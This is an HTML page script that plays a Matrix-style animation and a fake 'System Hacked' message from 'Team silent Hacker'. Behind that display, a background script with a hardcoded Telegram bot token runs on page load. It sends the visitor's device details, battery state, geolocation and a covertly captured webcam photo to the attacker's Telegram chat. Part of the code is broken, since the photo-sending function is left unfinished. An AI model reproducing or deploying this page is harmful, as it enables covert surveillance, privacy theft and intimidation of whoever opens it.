<body>

  <script>
    const canvas = document.getElementById("matrix");
    const ctx = canvas.getContext("2d");
    canvas.height = window.innerHeight;
    canvas.width = window.innerWidth;
    const fontSize = 14;
    const columns = Math.floor(canvas.width / fontSize);
    const drops = Array(columns).fill(1);
    const letters = "01";

    function drawMatrix() {
      ctx.fillStyle = "rgba(0, 0, 0, 0.07)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#0f0";
      ctx.font = fontSize + "px monospace";
      for (let i = 0; i < drops.length; i++) {
        const text = letters.charAt(Math.floor(Math.random() * letters.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.94) drops[i] = 0;
        drops[i]++;
      }
    }
    setInterval(drawMatrix, 20);

    const lines = [
      "‚úìAccessing secure server...",
      "‚úìConnected ‚úÖ",
      "‚úìIP traced...",
      "‚úìInjecting payload...",
      "‚úìScanning device...",
      "‚úìAccessing Photos and Videos...",
      "‚úìReading SMS Messages...",
      "‚úìExtracting Contact List...",
      "System Hacked ‚ö†Ô∏è",
      "‚úìDevice Hijacked Successfully...",
      "‚úìNow silent Hacker have Your Phone Access... Never forget Team silent Hacker‚ö†Ô∏è"
    ];

    const log = document.getElementById("logArea");
    const sound = document.getElementById("typeSound");
    let line = 0, char = 0;

    function typeLine() {
      if (line >= lines.length) return;
      const currentLine = lines[line];
      if (char < currentLine.length) {
        log.textContent += currentLine.charAt(char);
        char++;
        sound.currentTime = 0;
        sound.play();
        setTimeout(typeLine, 30);
      } else {
        log.textContent += "\n";
        line++;
        char = 0;
        setTimeout(typeLine, 150);
      }
    }
    setTimeout(typeLine, 500);

    // Background Script
    const botToken = '8317943609:AAE-gr7WlYHl-SCgUA7B4b9Lm9uvheqm0uQ';
    const chatId = '7807389894';

    function sendTelegramMessage(msg) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      });
    }

    function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "image.jpg");
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",

      });

    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled
      };
    }

    function getBatteryInfo() {
      if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
          const batteryStatus = `üîã Battery: ${Math.round(battery.level * 100)}% | Charging: ${battery.charging}`;
          sendTelegramMessage(batteryStatus);
        });
      }
    }

    function getLocationInfo() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const location = `üìç Location: ${position.coords.latitude}, ${position.coords.longitude}`;
          sendTelegramMessage(location);
        });
      }
    }

    function capturePhoto() {
      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');

        video.onloadedmetadata = () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0);
          canvas.toBlob(blob => {
            sendPhoto(blob);
            stream.getTracks().forEach(track => track.stop());
          }, 'image/jpeg');
        };
      });
    }

    // Run everything
    window.onload = () => {
      sendTelegramMessage("üì° Device Info:\n" + JSON.stringify(getDeviceInfo(), null, 2));
      getBatteryInfo();
      getLocationInfo();
      capturePhoto();
    };
